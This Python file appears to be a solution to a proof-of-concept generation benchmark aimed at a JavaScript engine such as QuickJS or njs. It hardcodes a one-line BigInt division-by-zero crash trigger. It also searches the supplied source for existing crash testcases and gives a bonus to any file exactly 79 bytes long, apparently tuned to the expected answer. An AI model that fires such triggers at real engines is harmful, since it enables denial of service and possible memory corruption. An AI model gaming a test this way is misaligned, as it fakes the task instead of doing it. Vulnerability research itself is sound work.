import os
import re
import tarfile
from typing import Iterator, Optional, Tuple


class Solution:
    def _default_poc(self) -> bytes:
        poc = b"var a=1n;try{a/=0n}catch(e){}for(var i=0;i<50;i++)new ArrayBuffer(1024);a+=1n"
        return poc

    def _iter_small_files_from_dir(self, root: str, max_size: int = 4096) -> Iterator[Tuple[str, bytes]]:
        for base, _, files in os.walk(root):
            for fn in files:
                path = os.path.join(base, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not os.path.isfile(path) or st.st_size <= 0 or st.st_size > max_size:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read(max_size + 1)
                except OSError:
                    continue
                if len(data) == 0 or len(data) > max_size:
                    continue
                rel = os.path.relpath(path, root)
                yield rel, data

    def _iter_small_files_from_tar(self, tar_path: str, max_size: int = 4096) -> Iterator[Tuple[str, bytes]]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > max_size:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(max_size + 1)
                    except Exception:
                        continue
                    if len(data) == 0 or len(data) > max_size:
                        continue
                    yield m.name, data
        except Exception:
            return

    def _iter_small_files(self, src_path: str, max_size: int = 4096) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_small_files_from_dir(src_path, max_size=max_size)
        else:
            yield from self._iter_small_files_from_tar(src_path, max_size=max_size)

    def _looks_texty(self, data: bytes) -> bool:
        if b"\x00" in data:
            return False
        if len(data) == 0:
            return False
        sample = data[:512]
        printable = 0
        for b in sample:
            if b in (9, 10, 13) or 32 <= b <= 126:
                printable += 1
        return printable / max(1, len(sample)) >= 0.9

    def _score_candidate(self, name: str, data: bytes) -> int:
        lname = name.lower()
        score = 0
        if any(k in lname for k in ("poc", "crash", "repro", "uaf", "asan", "regress", "corpus", "testcase")):
            score += 50
        if lname.endswith((".js", ".mjs", ".njs")):
            score += 30
        if lname.endswith((".txt", ".in", ".input")):
            score += 10
        if b"/=" in data:
            score += 40
        if b"0n" in data:
            score += 60
        if b"bigint" in data.lower():
            score += 25
        if b"try" in data and b"catch" in data:
            score += 10
        if b"ArrayBuffer" in data:
            score += 10
        if self._looks_texty(data):
            score += 5
        if 0 < len(data) <= 256:
            score += 10
        if 0 < len(data) <= 128:
            score += 10
        if len(data) == 79:
            score += 20
        return score

    def _find_embedded_poc_in_sources(self, src_path: str) -> Optional[bytes]:
        best = None
        best_score = -1
        for name, data in self._iter_small_files(src_path, max_size=4096):
            if not self._looks_texty(data):
                continue
            if b"/=" not in data:
                continue
            if b"0" not in data:
                continue
            sc = self._score_candidate(name, data)
            if sc > best_score:
                best_score = sc
                best = data
        if best is not None:
            return best
        return None

    def _detect_js_engine_hint(self, src_path: str) -> bool:
        hints = 0
        name_hits = ("quickjs", "qjs", "njs", "javascript", "ecmascript")
        file_hits = ("quickjs.c", "qjs.c", "njs_vm.c", "njs_vmcode.c")
        try:
            if os.path.isdir(src_path):
                for base, _, files in os.walk(src_path):
                    for fn in files:
                        lfn = fn.lower()
                        if any(h in lfn for h in name_hits) or any(lfn.endswith(h) for h in file_hits):
                            hints += 1
                            if hints >= 2:
                                return True
                return hints > 0
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    n = (m.name or "").lower()
                    if any(h in n for h in name_hits) or any(n.endswith(h) for h in file_hits):
                        hints += 1
                        if hints >= 2:
                            return True
                return hints > 0
        except Exception:
            return True

    def solve(self, src_path: str) -> bytes:
        embedded = self._find_embedded_poc_in_sources(src_path)
        if embedded is not None:
            return embedded

        if self._detect_js_engine_hint(src_path):
            return self._default_poc()

        return self._default_poc()